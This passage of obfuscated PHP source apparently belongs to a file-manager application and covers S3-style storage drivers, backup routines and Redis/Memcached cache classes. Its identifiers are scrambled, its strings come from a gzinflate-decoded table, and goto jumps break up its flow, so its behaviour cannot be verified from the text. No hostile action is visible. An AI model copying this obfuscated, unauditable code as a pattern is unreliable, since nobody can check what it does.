$äœÈÍ¹ó[98] => $¸Àê¤Ìó); } return array($äœÈÍ¹ó[33] => $äœÈÍ¹ó[958], $äœÈÍ¹ó[1410] => $¸Àê¤Ìó->pathDriver, $äœÈÍ¹ó[87] => $¶º¦ºƒ’, $äœÈÍ¹ó[98] => $¸Àê¤Ìó); } public static function pathDriverType($öñÌıóÃ) { return $öñÌıóÃ ? self::driverType(IO::init($öñÌıóÃ)) : !1; } public static function pathDriverLocal($é§ó¾Ñ) { $¹î»½Èå =& $_SERVER[¼’ç§¼´]; $³ÈôÅ«× = $é§ó¾Ñ ? self::driverType(IO::init($é§ó¾Ñ)) : !1; return strtolower($³ÈôÅ«×[$¹î»½Èå[33]]) == $¹î»½Èå[109] ? !0 : !1; } public static function allowCover($Í“¦¤±¤, $ìöØşß¦ = true) { $Ï¨ÈÀšü =& $_SERVER[¼’ç§¼´]; if (is_string($Í“¦¤±¤)) { $Í“¦¤±¤ = IO::info($Í“¦¤±¤); } if (!$Í“¦¤±¤ || $Í“¦¤±¤[$Ï¨ÈÀšü[33]] == $Ï¨ÈÀšü[78] || $Í“¦¤±¤[$Ï¨ÈÀšü[79]] <= 100) { return !1; } if (isset($Í“¦¤±¤[$Ï¨ÈÀšü[1417]]) || !$Í“¦¤±¤[$Ï¨ÈÀšü[87]]) { return !1; } if (isset($Í“¦¤±¤[$Ï¨ÈÀšü[234]]) && !$Í“¦¤±¤[$Ï¨ÈÀšü[234]]) { return !1; } static $÷“ÕñáÑ = false; if (!$÷“ÕñáÑ || !$ìöØşß¦) { $¡¨äø¿ = self::driverType(IO::init($Í“¦¤±¤[$Ï¨ÈÀšü[87]])); $˜“ë¡› = $¡¨äø¿[$Ï¨ÈÀšü[98]]; $÷“ÕñáÑ = $Ï¨ÈÀšü[196]; if ($¡¨äø¿[$Ï¨ÈÀšü[33]] == $Ï¨ÈÀšü[109]) { $÷“ÕñáÑ = $Ï¨ÈÀšü[1418]; } if ($¡¨äø¿[$Ï¨ÈÀšü[98]] && is_array($¡¨äø¿[$Ï¨ÈÀšü[98]]->config)) { $ĞÉü¸²° = $¡¨äø¿[$Ï¨ÈÀšü[98]]->config; if (isset($ĞÉü¸²°[$Ï¨ÈÀšü[1419]]) && $ĞÉü¸²°[$Ï¨ÈÀšü[1419]]) { $÷“ÕñáÑ = $Ï¨ÈÀšü[1418]; } } $ÄÙïØÃŸ = KodIO::defaultDriver(); if (strtolower($ÄÙïØÃŸ[$Ï¨ÈÀšü[98]]) == $Ï¨ÈÀšü[109] && is_array($ÄÙïØÃŸ[$Ï¨ÈÀšü[6]])) { $òæÓæî = $ÄÙïØÃŸ[$Ï¨ÈÀšü[6]][$Ï¨ÈÀšü[1271]]; if (substr($òæÓæî, 0, 2) == $Ï¨ÈÀšü[1420]) { $òæÓæî = str_replace($Ï¨ÈÀšü[1420], BASIC_PATH, $òæÓæî); } $òæÓæî = str_replace($Ï¨ÈÀšü[256], $Ï¨ÈÀšü[8], $òæÓæî); if (substr($Í“¦¤±¤[$Ï¨ÈÀšü[87]], 0, strlen($òæÓæî)) == $òæÓæî) { $÷“ÕñáÑ = $Ï¨ÈÀšü[196]; } } } return $÷“ÕñáÑ == $Ï¨ÈÀšü[1418] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($Ş¬‚«Å) { parent::__construct($Ş¬‚«Å); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Š¶‰ÌÇ) { $¹¨ƒÄ„ =& $_SERVER[¼’ç§¼´]; if (substr($Š¶‰ÌÇ, 0, 7) == $¹¨ƒÄ„[218]) { $Š¶‰ÌÇ = $¹¨ƒÄ„[219] . substr($Š¶‰ÌÇ, 7); } header($¹¨ƒÄ„[175] . $Š¶‰ÌÇ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($µéÈ°î¤) { parent::__construct($µéÈ°î¤); $this->setSignVersion($_SERVER[¼’ç§¼´][249]); } public function uploadFormData($®‘·¼çÃ, $ÉƒÏëÑÖ = 3600) { $¢ÕÓ’í =& $_SERVER[¼’ç§¼´]; $¡å‘¢ = $¢ÕÓ’í[231]; $»Ïèë¢ = $¢ÕÓ’í[1421]; $üÌ‹± = $¢ÕÓ’í[263]; $ÀÑğÉ¸ = gmdate($¢ÕÓ’í[1422], time() + $ÉƒÏëÑÖ); $œ¤¦†áÔ = (string) time() . $¢ÕÓ’í[74] . (string) (time() + $ÉƒÏëÑÖ); $å˜‡¥Å = array($¢ÕÓ’í[264] => $ÀÑğÉ¸, $¢ÕÓ’í[267] => array(array($¢ÕÓ’í[308] => $¡å‘¢), array($¢ÕÓ’í[268] => $this->bucket), array($¢ÕÓ’í[269], $¢ÕÓ’í[270], $¢ÕÓ’í[12]), array($¢ÕÓ’í[272] => $üÌ‹±), array($¢ÕÓ’í[1423] => $»Ïèë¢), array($¢ÕÓ’í[1424] => $this->accessKey), array($¢ÕÓ’í[1425] => $œ¤¦†áÔ))); $å˜‡¥Å = json_encode($å˜‡¥Å); $İ„¸°÷ = hash_hmac($¢ÕÓ’í[1421], $œ¤¦†áÔ, $this->secret); $˜Ú³°Ğâ = sha1($å˜‡¥Å); $å‰íÜá„ = hash_hmac($¢ÕÓ’í[1421], $˜Ú³°Ğâ, $İ„¸°÷); $…¥ù¾¼å = array($¢ÕÓ’í[308] => $¡å‘¢, $¢ÕÓ’í[272] => $üÌ‹±, $¢ÕÓ’í[279] => base64_encode($å˜‡¥Å), $¢ÕÓ’í[1423] => $»Ïèë¢, $¢ÕÓ’í[1424] => $this->accessKey, $¢ÕÓ’í[1426] => $œ¤¦†áÔ, $¢ÕÓ’í[1427] => $å‰íÜá„, $¢ÕÓ’í[208] => $this->getHost()); return $…¥ù¾¼å; } public function fileOutImage($Ôï§’¥, $°à€Û›ç = 250) { $ãşá¬€÷ =& $_SERVER[¼’ç§¼´]; if ($this->size($Ôï§’¥) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ôï§’¥, $°à€Û›ç); } $‚ ƒ‘¯ = $this->link($Ôï§’¥); $‚ ƒ‘¯ .= $ãşá¬€÷[1428] . $°à€Û›ç . $ãşá¬€÷[1429]; $this->fileOutLink($‚ ƒ‘¯); } public function fileOutLink($×–íŒšÑ) { $ü™ˆÖ‘ù =& $_SERVER[¼’ç§¼´]; if (substr($×–íŒšÑ, 0, 7) == $ü™ˆÖ‘ù[218]) { $×–íŒšÑ = $ü™ˆÖ‘ù[219] . substr($×–íŒšÑ, 7); } header($ü™ˆÖ‘ù[175] . $×–íŒšÑ); die; } } goto F·ÏÑª…ß; F÷±Êº‘ê²: if (!$yvenukjfdm) { die; } $_SERVER[©º°î³Ë] = explode($_SERVER[¼’ç§¼´][694], gzinflate(substr($_SERVER[¼’ç§¼´][695], 10, -8))); $xqknujgyzm = $_SERVER[¼’ç§¼´][696]; goto eÛâªç–™®; c£©Ş¨´¸ : class BackupDbFile { public function __construct() { } public function index() { $Èßİâ›‹ =& $_SERVER[¼’ç§¼´]; $ŒÆ«ªÃè = Backup::get(); $¨ ¶ëÀß = $ŒÆ«ªÃè[$Èßİâ›‹[32]]; $ˆìéïÏ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\x5f{$¨ ¶ëÀß}\x2f"; $ÀÔÀ—Áø = $this->backupPath($ŒÆ«ªÃè); if (!($ÀÔÀ—Áø = IO::mkdir($ÀÔÀ—Áø))) { return !1; } $ÙşñÑÀä = IO::listPath($ˆìéïÏ); $Ù”™‚¤ = isset($ÙşñÑÀä[$Èßİâ›‹[86]]) ? $ÙşñÑÀä[$Èßİâ›‹[86]] : array(); $ ±÷ƒ‡Ö = array_sum(array_column($Ù”™‚¤, $Èßİâ›‹[79])); if (!$ ±÷ƒ‡Ö) { return !1; } $®©¯ŸßÀ = array($Èßİâ›‹[887] => $ ±÷ƒ‡Ö, $Èßİâ›‹[888] => time()); Backup::set($®©¯ŸßÀ); $ÜïÁÃª = new TaskFileTransfer($Èßİâ›‹[889], $Èßİâ›‹[872], count($Ù”™‚¤), LNG($Èßİâ›‹[873]) . $Èßİâ›‹[473] . LNG($Èßİâ›‹[875]) . $Èßİâ›‹[890]); $ÜïÁÃª->task[$Èßİâ›‹[851]] = $ ±÷ƒ‡Ö; foreach ($ÙşñÑÀä[$Èßİâ›‹[86]] as $¡›ÅÏû¾) { $ˆ¥”«Ø× = IO::move($¡›ÅÏû¾[$Èßİâ›‹[87]], $ÀÔÀ—Áø); if (!$ˆ¥”«Ø×) { $ÜïÁÃª->end(); $—¨Ø•¬¤ = IO::getLastError($Èßİâ›‹[891] . $¡›ÅÏû¾[$Èßİâ›‹[87]] . $Èßİâ›‹[892] . $ÀÔÀ—Áø . $Èßİâ›‹[178]); write_log($—¨Ø•¬¤, $Èßİâ›‹[872]); return !1; } } $¬Ÿ¹ÇÕš = new DbManage(); $ÈªïÕ¢¬ = $¬Ÿ¹ÇÕš->getSqlFile(); if (!$ÈªïÕ¢¬[$Èßİâ›‹[893]] || !$ÈªïÕ¢¬[$Èßİâ›‹[13]]) { return !1; } IO::move($ÈªïÕ¢¬[$Èßİâ›‹[893]], $ÀÔÀ—Áø); IO::move($ÈªïÕ¢¬[$Èßİâ›‹[13]], $ÀÔÀ—Áø); $ÜïÁÃª->end(); $®©¯ŸßÀ = array($Èßİâ›‹[894] => $ ±÷ƒ‡Ö, $Èßİâ›‹[895] => time()); Backup::set($®©¯ŸßÀ); return !0; } private function backupPath($°ñ»ªã) { $Ñà¹¡Å =& $_SERVER[¼’ç§¼´]; $Ğ¢¦·¸Ì = $°ñ»ªã[$Ñà¹¡Å[32]]; $’“ú¨© = Model($Ñà¹¡Å[858])->get($Ñà¹¡Å[859]); $ÂºÄÀÑ¬ = substr(md5($Ñà¹¡Å[860] . $’“ú¨© . $Ğ¢¦·¸Ì), 0, 8); return "\x7b\151\x6f\72{$°ñ»ªã[$Ñà¹¡Å[840]]}\175\57\144\141\164\141\x62\x61\163\x65\57\x62\x61\143\153\165\x70\57" . $Ğ¢¦·¸Ì . $Ñà¹¡Å[11] . $ÂºÄÀÑ¬; } private function tmpFilesPath() { $îì¸½­Ì =& $_SERVER[¼’ç§¼´]; $•ûˆŒÃë = TEMP_FILES; if ($GLOBALS[$îì¸½­Ì[6]][$îì¸½­Ì[92]][$îì¸½­Ì[885]]) { $•ûˆŒÃë = $GLOBALS[$îì¸½­Ì[6]][$îì¸½­Ì[92]][$îì¸½­Ì[885]]; if (!mk_dir($•ûˆŒÃë) || !is_writable($•ûˆŒÃë) || !IO::mkfile($•ûˆŒÃë . $îì¸½­Ì[886])) { $•ûˆŒÃë = TEMP_FILES; } } return $•ûˆŒÃë; } } class BackupFile { public function __construct() { } public function index() { $’Ó÷ı = Backup::get(); $’€Ùì™© = $’Ó÷ı[$_SERVER[¼’ç§¼´][370]][$_SERVER[¼’ç§¼´][232]][$_SERVER[¼’ç§¼´][552]]; $…à–¸éÔ = array($_SERVER[¼’ç§¼´][553] => array($_SERVER[¼’ç§¼´][896], $’€Ùì™©), $_SERVER[¼’ç§¼´][897] => array($_SERVER[¼’ç§¼´][408], $’Ó÷ı[$_SERVER[¼’ç§¼´][840]])); $ƒÛ˜ŸçÊ = (int) Model($_SERVER[¼’ç§¼´][878])->where($…à–¸éÔ)->count($_SERVER[¼’ç§¼´][552]); $ÌË²ªÙæ = (int) Model($_SERVER[¼’ç§¼´][878])->where($…à–¸éÔ)->sum($_SERVER[¼’ç§¼´][79]); $ÏÂ†×³× = new TaskFileTransfer($_SERVER[¼’ç§¼´][898], $_SERVER[¼’ç§¼´][872], $ƒÛ˜ŸçÊ, LNG($_SERVER[¼’ç§¼´][873]) . $_SERVER[¼’ç§¼´][874] . LNG($_SERVER[¼’ç§¼´][899])); $ÏÂ†×³×->task[$_SERVER[¼’ç§¼´][851]] = $ÌË²ªÙæ; $’„»È¼å = array($_SERVER[¼’ç§¼´][900] => $ƒÛ˜ŸçÊ, $_SERVER[¼’ç§¼´][901] => $ÌË²ªÙæ, $_SERVER[¼’ç§¼´][902] => time()); Backup::set($’„»È¼å); $¨’™ = !0; $•™øü Ó = $this->storeIds(); $’µ‰³í = 1; $şòŞì¡ö = 1000; $·×š€èé = $¯šü¸×Ì = 0; $Á­ÖŞô = array(); $Ë öÚÔ± = $‹î®³ıš = 0; do { $Ë°ø¡ó = $_SERVER[¼’ç§¼´][903]; $¨‚õÅ¥Ü = Model($_SERVER[¼’ç§¼´][878])->where($…à–¸éÔ)->field($Ë°ø¡ó)->order($_SERVER[¼’ç§¼´][904])->selectPage($şòŞì¡ö, $’µ‰³í); $Å™ƒéÅ = !empty($¨‚õÅ¥Ü[$_SERVER[¼’ç§¼´][456]]) ? $¨‚õÅ¥Ü[$_SERVER[¼’ç§¼´][456]] : array(); foreach ($Å™ƒéÅ as $Ø›…¬®) { if (!$this->_fileExist($Ø›…¬®, $Á­ÖŞô, $•™øü Ó)) { write_log("\x66\x69\154\145\40\156\x6f\x74\x20\145\170\x69\x73\164\x2e\146\151\x6c\145\x49\x44\72{$Ø›…¬®[$_SERVER[¼’ç§¼´][552]]}\54\x20\x70\141\x74\150\72{$Ø›…¬®[$_SERVER[¼’ç§¼´][87]]}", $_SERVER[¼’ç§¼´][905]); continue; } $‰Ü“¥êø = $Ø›…¬®[$_SERVER[¼’ç§¼´][87]]; $õ“§ÕÀ¥ = "\173\x69\x6f\72{$’Ó÷ı[$_SERVER[¼’ç§¼´][840]]}\175" . substr($‰Ü“¥êø, strlen("\173\x69\x6f\72{$Ø›…¬®[$_SERVER[¼’ç§¼´][906]]}\x7d")); if (IO::exist($õ“§ÕÀ¥)) { $ÏÂ†×³×->updateFileEnd($Ø›…¬®[$_SERVER[¼’ç§¼´][32]], $Ø›…¬®[$_SERVER[¼’ç§¼´][79]]); } else { $õ“§ÕÀ¥ = get_path_father($õ“§ÕÀ¥); IO::mkdir($õ“§ÕÀ¥); if (!IO::copy($‰Ü“¥êø, $õ“§ÕÀ¥, $_SERVER[¼’ç§¼´][907])) { write_log($_SERVER[¼’ç§¼´][908] . $‰Ü“¥êø . $_SERVER[¼’ç§¼´][892] . $õ“§ÕÀ¥ . $_SERVER[¼’ç§¼´][178], $_SERVER[¼’ç§¼´][872]); $¨’™ = !1; break; } } $’€Ùì™© = $Ø›…¬®[$_SERVER[¼’ç§¼´][552]]; $¯šü¸×Ì += 1; $·×š€èé += $Ø›…¬®[$_SERVER[¼’ç§¼´][79]]; $‹î®³ıš += 1; $Ë öÚÔ± += $Ø›…¬®[$_SERVER[¼’ç§¼´][79]]; if ($·×š€èé >= 1024 * 1024 * 100) { $’„»È¼å = array($_SERVER[¼’ç§¼´][839] => $’€Ùì™©, $_SERVER[¼’ç§¼´][909] => $‹î®³ıš, $_SERVER[¼’ç§¼´][910] => $Ë öÚÔ±); Backup::set($’„»È¼å); $·×š€èé = $¯šü¸×Ì = 0; } } $©Ë‚»‰ = count($Å™ƒéÅ); $’µ‰³í++; } while ($©Ë‚»‰ == $şòŞì¡ö); $ÏÂ†×³×->end(); $’„»È¼å = array($_SERVER[¼’ç§¼´][911] => 1, $_SERVER[¼’ç§¼´][849] => time(), $_SERVER[¼’ç§¼´][863] => 1, $_SERVER[¼’ç§¼´][839] => $’€Ùì™©, $_SERVER[¼’ç§¼´][912] => time()); if ($¯šü¸×Ì) { $’„»È¼å[$_SERVER[¼’ç§¼´][909]] = $‹î®³ıš; $’„»È¼å[$_SERVER[¼’ç§¼´][910]] = $Ë öÚÔ±; } Backup::set($’„»È¼å); return !0; } private function _fileExist($¶÷äãšß, &$û®û¢Ÿ, $æÄáæò) { $­æû£˜´ =& $_SERVER[¼’ç§¼´]; $³¾ÈÓ¤£ = $¶÷äãšß[$­æû£˜´[87]]; if (in_array($¶÷äãšß[$­æû£˜´[552]], $û®û¢Ÿ)) { return !1; } if (!in_array($¶÷äãšß[$­æû£˜´[906]], $æÄáæò)) { return !1; } if (IO::exist($³¾ÈÓ¤£)) { return !0; } $·ùØãüÒ = get_path_father($³¾ÈÓ¤£); if (IO::exist($·ùØãüÒ)) { $û®û¢Ÿ[] = $¶÷äãšß[$­æû£˜´[552]]; return !1; } $Şãù–Œš = array($­æû£˜´[906] => $¶÷äãšß[$­æû£˜´[906]], $­æû£˜´[87] => array($­æû£˜´[470], "{$·ùØãüÒ}\45")); $—Ò´£…œ = Model($­æû£˜´[878])->where($Şãù–Œš)->field($­æû£˜´[553])->select(); $û®û¢Ÿ = array_merge($û®û¢Ÿ, array_to_keyvalue($—Ò´£…œ, $­æû£˜´[12], $­æû£˜´[552])); return !1; } private function _fileFilter($šÑÉ†ˆí) { $œÚÀŒá =& $_SERVER[¼’ç§¼´]; return; if (empty($šÑÉ†ˆí)) { return; } $’¸†ÕŠ— = array($œÚÀŒá[552] => array($œÚÀŒá[7], array_unique($šÑÉ†ˆí))); $ç€–†‚ = Model($œÚÀŒá[913])->where($’¸†ÕŠ—)->field($œÚÀŒá[193])->select(); foreach ($ç€–†‚ as $ší‡ÑÀ¶) { Model($œÚÀŒá[913])->remove($ší‡ÑÀ¶[$œÚÀŒá[193]], !1); } } private function storeIds() { $¨×—µµ =& $_SERVER[¼’ç§¼´]; $æ³õ¨âæ = Model($¨×—µµ[855])->listData(); $²–üÌ¾Ü = array(); $ØÜüƒì¢ = $GLOBALS[$¨×—µµ[6]][$¨×—µµ[92]][$¨×—µµ[914]]; foreach ($æ³õ¨âæ as $¶Õ…û®—) { $È Û¢‚ = strtolower($¶Õ…û®—[$¨×—µµ[98]]); if (!isset($ØÜüƒì¢[$È Û¢‚])) { continue; } $úªÛÇ¦ğ = $¨×—µµ[77] . (isset($ØÜüƒì¢[$È Û¢‚]) ? $ØÜüƒì¢[$È Û¢‚] : ucfirst($È Û¢‚)); if (!class_exists($úªÛÇ¦ğ)) { continue; } $²–üÌ¾Ü[] = $¶Õ…û®—[$¨×—µµ[486]]; } return $²–üÌ¾Ü; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÆûÁòÕˆ =& $_SERVER[¼’ç§¼´]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $®Ì¡ğ×ƒ = $GLOBALS[$ÆûÁòÕˆ[6]][$ÆûÁòÕˆ[426]]; $¤î­„û× = $®Ì¡ğ×ƒ[$®Ì¡ğ×ƒ[$ÆûÁòÕˆ[915]]]; $…îôîå¡ = $®Ì¡ğ×ƒ[$ÆûÁòÕˆ[916]]; switch ($®Ì¡ğ×ƒ[$ÆûÁòÕˆ[915]]) { case $ÆûÁòÕˆ[21]: self::$handle = Model($ÆûÁòÕˆ[917]); break; case $ÆûÁòÕˆ[918]: self::$handle = new CacheRedis($¤î­„û×, $…îôîå¡); break; case $ÆûÁòÕˆ[919]: self::$handle = new CacheMemcached($¤î­„û×, $…îôîå¡); break; case $ÆûÁòÕˆ[232]: self::$handle = new CacheFile($¤î­„û×, $…îôîå¡); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¥ÀÄ‹£‹) { if (is_array($¥ÀÄ‹£‹) || is_object($¥ÀÄ‹£‹)) { $¥ÀÄ‹£‹ = json_encode($¥ÀÄ‹£‹); } $¥ÀÄ‹£‹ = rawurlencode($¥ÀÄ‹£‹); return md5(KOD_SITE_ID . $_SERVER[¼’ç§¼´][11] . $¥ÀÄ‹£‹); } public static function get($õ—èëÓ­, $Ö•œá»‰ = false) { $ÓøÂùĞ = self::key($õ—èëÓ­); $“óÆØà  = self::init(); if ($Ö•œá»‰) { return unserialize($“óÆØà ->get($ÓøÂùĞ)); } if (!isset(self::$memoryCache[$ÓøÂùĞ])) { $¬ÂµÚµó = $“óÆØà ->get($ÓøÂùĞ); self::$memoryCache[$ÓøÂùĞ] = unserialize($¬ÂµÚµó); } return self::$memoryCache[$ÓøÂùĞ]; } public static function set($ä¨ãÊë, $å™Ô¼ç, $åÌ¤½Ñ˜ = false) { $…‘Ç÷Ò =& $_SERVER[¼’ç§¼´]; $Ùâ¨Õ‰ = self::key($ä¨ãÊë); if (isset(self::$memoryCache[$Ùâ¨Õ‰]) && self::$memoryCache[$Ùâ¨Õ‰] === $å™Ô¼ç) { return !0; } if ($åÌ¤½Ñ˜ === 0) { self::$memoryCache[$Ùâ¨Õ‰] = $å™Ô¼ç; return !0; } $ğ¢í££ä = self::init(); $˜ó¡àÈ¢ = serialize($å™Ô¼ç); CacheLock::lock($ä¨ãÊë . $…‘Ç÷Ò[920]); $«‘›İôÆ = $ğ¢í££ä->set($Ùâ¨Õ‰, $˜ó¡àÈ¢, $åÌ¤½Ñ˜); self::$memoryCache[$Ùâ¨Õ‰] = $å™Ô¼ç; CacheLock::unlock($ä¨ãÊë . $…‘Ç÷Ò[920]); return $«‘›İôÆ; } public static function getCall($Õıåè¬š, $÷÷îÁã, $¬ó©ï¸, $¶ê‘ï€Š = array()) { $æØû½¡Û =& $_SERVER[¼’ç§¼´]; $ôÛ¨õ— = self::get($Õıåè¬š); if ($ôÛ¨õ— || $ôÛ¨õ— === $æØû½¡Û[12]) { return $ôÛ¨õ—; } $ôÛ¨õ— = call_user_func_array($¬ó©ï¸, $¶ê‘ï€Š); $ôÛ¨õ— = $ôÛ¨õ— ? $ôÛ¨õ— : $æØû½¡Û[12]; self::set($Õıåè¬š, $ôÛ¨õ—, $÷÷îÁã); return $ôÛ¨õ—; } public static function remove($ü…ë¾Ä) { $°‰·ƒòê = self::key($ü…ë¾Ä); unset(self::$memoryCache[$°‰·ƒòê]); self::clearTimeout(); CacheLock::lock($ü…ë¾Ä); $ßó­¨ë’ = self::init()->remove($°‰·ƒòê); CacheLock::unlock($ü…ë¾Ä); return $ßó­¨ë’; } public static function removeMemory($È­‹ìÀâ) { $¨âÅ¯Şõ = self::key($È­‹ìÀâ); unset(self::$memoryCache[$¨âÅ¯Şõ]); } public static function clearMemory($Š—Ÿûîå = false) { if ($Š—Ÿûîå) { $Š—Ÿûîå = self::key($Š—Ÿûîå); unset(self::$memoryCache[$Š—Ÿûîå]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¼’ç§¼´][921])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¼’ç§¼´][922])) { self::init()->clearTimeout(); } } } goto D¨óá…Ü±Ÿ; D…«öÕ”Œˆ: define($_SERVER[¼’ç§¼´][0], $_SERVER[¼’ç§¼´][1]); $_SERVER[×şÎ» Ü] = explode($_SERVER[¼’ç§¼´][2], gzinflate(substr($_SERVER[¼’ç§¼´][3], 10, -8))); function binCheckEq($‹øûàÜ, $¥ØÃèôÇ) { return $‹øûàÜ == $¥ØÃèôÇ; } goto B‘ø˜‚Ã÷; FñùŒ†¢ñÇ: class CacheLockDatabase { public function lock($»ïª£—Ÿ, $¥¥©şË = 0) { $½„û«òÒ = Model($_SERVER[¼’ç§¼´][917]); $¤ú£Ñ¯ = microtime(!0) + $¥¥©şË; while (microtime(!0) < $¤ú£Ñ¯) { $’Å¿–çÑ = $½„û«òÒ->get($»ïª£—Ÿ); if (!$’Å¿–çÑ || $’Å¿–çÑ < microtime(!0)) { $ÓÎ×¾™ = $½„û«òÒ->set($»ïª£—Ÿ, $¤ú£Ñ¯); if ($ÓÎ×¾™) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($•ÊÕ‘ô) { return Model($_SERVER[¼’ç§¼´][917])->get($•ÊÕ‘ô); } public function unlock($ãŸú«¸Œ) { Model($_SERVER[¼’ç§¼´][917])->remove($ãŸú«¸Œ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($éİë²õÑ, $ Õ¬³Ÿ) { $¨³€º² =& $_SERVER[¼’ç§¼´]; if (!class_exists($¨³€º²[956])) { show_json($¨³€º²[957], !1); } $this->cacheTime = $ Õ¬³Ÿ; $this->handle = new Memcached(); if (is_array($éİë²õÑ[$¨³€º²[958]]) && count($éİë²õÑ[$¨³€º²[958]]) >= 1) { foreach ($éİë²õÑ[$¨³€º²[958]] as $çúË°ëÆ) { $Ç¦¢¡¤ì = explode($¨³€º²[4], $çúË°ëÆ); $this->handle->addServer($Ç¦¢¡¤ì[0], $Ç¦¢¡¤ì[1]); } } else { $this->handle->addServer($éİë²õÑ[$¨³€º²[208]], $éİë²õÑ[$¨³€º²[209]]); } } public function set($’Ù¿ÚÜ, $˜øÆïÒÅ, $ÉÄÔÄĞ = false) { $ÉÄÔÄĞ = $ÉÄÔÄĞ ? $ÉÄÔÄĞ : $this->cacheTime; return $this->handle->set($’Ù¿ÚÜ, $˜øÆïÒÅ, $ÉÄÔÄĞ); } public function get($‚ÃÅè‰ğ) { return $this->handle->get($‚ÃÅè‰ğ); } public function remove($§ÔÉÌÈı) { return $this->handle->delete($§ÔÉÌÈı); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ãŞç€ó, $†İ¬ôâå) { $à‘«¡¾Ï =& $_SERVER[¼’ç§¼´]; if (!class_exists($à‘«¡¾Ï[959])) { show_json($à‘«¡¾Ï[960], !1); } $this->cacheTime = $†İ¬ôâå; $ÊŒéŸğ = isset($ãŞç€ó[$à‘«¡¾Ï[961]]) ? $ãŞç€ó[$à‘«¡¾Ï[961]] : 10; $¤ğáäÓ = _get($ãŞç€ó, $à‘«¡¾Ï[958]); if ($¤ğáäÓ && is_array($¤ğáäÓ)) { $this->initCluster($ãŞç€ó, $ÊŒéŸğ); } else { $this->handle = $this->init($ãŞç€ó, $ÊŒéŸğ); } } private function init($­Â¸’—, $Çêì©Ï) { $ìÒÊåú© =& $_SERVER[¼’ç§¼´]; $İ®Éï¯— = new Redis(); $„ÖÁÈ™ = isset($­Â¸’—[$ìÒÊåú©[962]]) ? $­Â¸’—[$ìÒÊåú©[962]] : !1; if ($„ÖÁÈ™) { $İ®Éï¯—->pconnect($­Â¸’—[$ìÒÊåú©[208]], $­Â¸’—[$ìÒÊåú©[209]], $Çêì©Ï); } else { $İ®Éï¯—->connect($­Â¸’—[$ìÒÊåú©[208]], $­Â¸’—[$ìÒÊåú©[209]], $Çêì©Ï); } if (!empty($­Â¸’—[$ìÒÊåú©[498]])) { $İ®Éï¯—->auth($­Â¸’—[$ìÒÊåú©[498]]); } if (!empty($­Â¸’—[$ìÒÊåú©[845]]) && $­Â¸’—[$ìÒÊåú©[845]] != 0) { $İ®Éï¯—->select($­Â¸’—[$ìÒÊåú©[845]]); } return $İ®Éï¯—; } private function initCluster($éÈã£«, $ï”¤‰Í») { $óÕÑ«Ó  =& $_SERVER[¼’ç§¼´]; $‘Ÿ˜ïú“ = array($óÕÑ«Ó [963], $óÕÑ«Ó [964], $óÕÑ«Ó [965]); $¯ŸÃ‘ ® = $óÕÑ«Ó [963]; if (isset($éÈã£«[$óÕÑ«Ó [16]]) && in_array($éÈã£«[$óÕÑ«Ó [16]], $‘Ÿ˜ïú“)) { $¯ŸÃ‘ ® = $éÈã£«[$óÕÑ«Ó [16]]; } switch ($¯ŸÃ‘ ®) { case $óÕÑ«Ó [963]: $this->_slave($éÈã£«, $ï”¤‰Í»); break; case $óÕÑ«Ó [964]: break; case $óÕÑ«Ó [965]: $this->isCluster = !0; $‚ï“¦ ª = $éÈã£«[$óÕÑ«Ó [958]]; $®œ†ûÍÃ = isset($éÈã£«[$óÕÑ«Ó [962]]) ? $éÈã£«[$óÕÑ«Ó [962]] : !1; $Í•ïÙªŸ = isset($éÈã£«[$óÕÑ«Ó [498]]) ? $éÈã£«[$óÕÑ«Ó [498]] : null; $this->handle = new RedisCluster(NUll, $‚ï“¦ ª, $ï”¤‰Í», $ï”¤‰Í», $®œ†ûÍÃ, $Í•ïÙªŸ); break; default: break; } } private function _slave($¾×ƒ‹Éæ, $àÑğÄšÒ) { $İ©òô†• = $¾×ƒ‹Éæ[$_SERVER[¼’ç§¼´][958]]; $this->filterConfig($¾×ƒ‹Éæ, $İ©òô†•[0]); $this->handle = $this->init($¾×ƒ‹Éæ, $àÑğÄšÒ); unset($İ©òô†•[0]); if (empty($İ©òô†•)) { return; } $ø¾ñ¦¼„ = array_rand($İ©òô†•); $this->filterConfig($¾×ƒ‹Éæ, $İ©òô†•[$ø¾ñ¦¼„]); $this->slaveHandle = $this->init($¾×ƒ‹Éæ, $àÑğÄšÒ); } private function filterConfig(&$ÙÚù–äû, $õùâïõ ) { $Âéı†Ô =& $_SERVER[¼’ç§¼´]; $ÂŸİĞ¹µ = explode($Âéı†Ô[4], $õùâïõ ); $à¿Ö×¥ = array($Âéı†Ô[208] => $ÂŸİĞ¹µ[0], $Âéı†Ô[209] => $ÂŸİĞ¹µ[1]); $ÙÚù–äû = array_merge($ÙÚù–äû, $à¿Ö×¥); } public function set($™ñĞ†‰ê, $¯æŞßÌ, $İ˜éÆÒä = false) { $İ˜éÆÒä = $İ˜éÆÒä ? $İ˜éÆÒä : $this->cacheTime; return $this->handle->setEx($™ñĞ†‰ê, $İ˜éÆÒä, $¯æŞßÌ); } public function setLock($Â÷ìõ’Ğ, $íÑš”„, $èŠ²äÊ™) { return $this->handle->setNX($Â÷ìõ’Ğ, $íÑš”„); } public function get($ôÀ¿Ë¨ê) { $àÇšÍø = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $àÇšÍø->get($ôÀ¿Ë¨ê); } public function remove($¾¾©¡ë) { return $this->handle->del($¾¾©¡ë); } public function deleteAll() { $ïÆôÛê =& $_SERVER[¼’ç§¼´]; if (!isset($_SERVER[$ïÆôÛê[434]]) || !isset($_SERVER[$ïÆôÛê[432]])) { $³»Ì¯³è = $ïÆôÛê[966]; $æşŞ•äÀ = 